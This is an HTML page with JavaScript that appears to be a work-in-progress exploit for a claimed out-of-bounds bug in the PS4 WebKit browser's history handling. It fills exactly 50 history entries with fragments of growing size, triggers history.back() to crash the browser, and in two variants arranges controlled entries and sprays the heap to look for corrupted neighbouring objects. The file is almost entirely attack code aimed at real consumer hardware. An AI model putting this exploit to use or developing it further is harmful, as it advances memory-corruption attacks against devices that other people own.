<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Array OOB Exploitation</title>

</head>
<body>
<h2>PS4 WebKit – Array OOB in HistoryController</h2>
<button onclick="runBaseline()">BASELINE – Confirm 50-entry threshold crash</button>
<button onclick="runControlled()">OPTION E – Controlled 50 entries</button>
<button onclick="runSprayed()">OPTION F – Spray adjacent slots</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m, cls=""){ 
  const span = document.createElement("span");
  if(cls) span.className = cls;
  span.textContent = m + "\n";
  logEl.appendChild(span);
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const MAGIC_THRESHOLD = 50; // Confirmed: crash requires exactly 50 entries

let heap = [];
let popstateCount = 0;

window.addEventListener("popstate", (e) => {
  popstateCount++;
  log(`[POPSTATE #${popstateCount}] state=${JSON.stringify(e.state)?.slice(0,60)}`, "success");
});

// -------------------------------------------------
// BASELINE – Reproduce with correct understanding
// -------------------------------------------------
async function runBaseline(){
  logEl.textContent = "";
  heap = [];
  popstateCount = 0;
  
  log("=== BASELINE – 50 Entry Threshold Test ===");
  log(`Target: ${MAGIC_THRESHOLD} entries → crash on back()`, "critical");
  
  let size = BASE;
  for(let i=0; i<MAGIC_THRESHOLD; i++){
    heap.push("G".repeat(32768));
    const fragment = "A".repeat(size);
    
    log(`[ENTRY ${i}/${MAGIC_THRESHOLD}] size=${size}`);
    history.pushState({index:i, marker:"baseline"}, "", "#"+fragment);
    
    if(i % 6 === 0 && i > 0){
      setTimeout(()=>history.back(), 0);
      log("  → back() scheduled", "warn");
    }
    
    size += STEP;
    await sleep(3);
  }
  
  log(`>>> 50 ENTRIES REACHED <<<`, "critical");
  await sleep(100);
  
  log(`[TRIGGER] Executing back() on entry 50`, "critical");
  history.back(); // This should crash
  
  await sleep(500);
  log("=== BASELINE END (should not reach) ===");
}

// -------------------------------------------------
// OPTION E – Controlled entries to probe OOB
// -------------------------------------------------
async function runControlled(){
  logEl.textContent = "";
  heap = [];
  popstateCount = 0;
  
  log("=== OPTION E – Controlled Entries ===", "critical");
  log("Strategy: Fill 50 slots with distinct patterns");
  
  // Phase 1: Fill first 48 with small, controlled data
  log("\n[PHASE 1] Filling entries 0-47 with controlled data");
  for(let i=0; i<48; i++){
    const marker = String.fromCharCode(65 + (i % 26)); // A-Z pattern
    const fragment = marker.repeat(100); // Small, predictable
    
    history.pushState({
      index: i,
      marker: marker,
      phase: "controlled"
    }, "", "#"+fragment);
    
    if(i % 10 === 0) log(`  Entry ${i}: ${marker}×100`);
    await sleep(2);
  }
  
  // Phase 2: Entry 48-49 with large payloads
  log("\n[PHASE 2] Entries 48-49 with large payloads", "warn");
  
  const size48 = BASE + STEP * 48;
  history.pushState({
    index: 48,
    marker: "CRITICAL_48",
    size: size48
  }, "", "#"+"X".repeat(size48));
  log(`  Entry 48: X×${size48}`);
  
  await sleep(5);
  
  const size49 = BASE + STEP * 49;
  history.pushState({
    index: 49,
    marker: "CRITICAL_49",
    size: size49
  }, "", "#"+"Y".repeat(size49));
  log(`  Entry 49: Y×${size49}`);
  
  log(`\n>>> 50 ENTRIES REACHED <<<`, "critical");
  await sleep(100);
  
  // Trigger
  log(`[TRIGGER] Executing back()`, "critical");
  history.back();
  
  await sleep(500);
  log(`\nPopstate count: ${popstateCount}`);
  log(`Current hash: ${location.hash.slice(0,50)}...`);
  log("=== OPTION E END ===");
}

// -------------------------------------------------
// OPTION F – Heap spray adjacent to history array
// -------------------------------------------------
async function runSprayed(){
  logEl.textContent = "";
  heap = [];
  popstateCount = 0;
  
  log("=== OPTION F – Adjacent Slot Spray ===", "critical");
  log("Strategy: Spray heap before filling history");
  
  // Spray phase
  log("\n[SPRAY] Creating adjacent objects");
  const SPRAY_COUNT = 1000;
  const spray = [];
  for(let i=0; i<SPRAY_COUNT; i++){
    spray.push({
      id: i,
      marker: "SPRAY",
      data: "Z".repeat(1024)
    });
  }
  log(`  Created ${SPRAY_COUNT} spray objects`);
  
  // Small delay to let allocator settle
  await sleep(50);
  
  // Fill history
  log("\n[FILL] Populating 50 history entries");
  let size = BASE;
  for(let i=0; i<MAGIC_THRESHOLD; i++){
    const fragment = "H".repeat(size);
    history.pushState({index:i, marker:"spray_test"}, "", "#"+fragment);
    
    if(i % 10 === 0) log(`  Entry ${i}/${MAGIC_THRESHOLD}`);
    
    size += STEP;
    await sleep(2);
  }
  
  log(`\n>>> 50 ENTRIES + SPRAY <<<`, "critical");
  await sleep(100);
  
  // Trigger
  log(`[TRIGGER] back() with spray objects adjacent`, "critical");
  history.back();
  
  await sleep(500);
  
  // Check for corruption
  log(`\n[CHECK] Spray object integrity:`);
  let corrupted = 0;
  for(let i=0; i<100; i++){
    if(spray[i].marker !== "SPRAY"){
      corrupted++;
      log(`  Object ${i} CORRUPTED: ${spray[i].marker}`, "critical");
    }
  }
  log(`  Corrupted: ${corrupted}/100`);
  
  log("=== OPTION F END ===");
}

log("Ready. Understanding: Bug requires EXACTLY 50 history entries.");
log("Run BASELINE to confirm, then E and F to probe exploitation.");
</script>
</body>
</html>
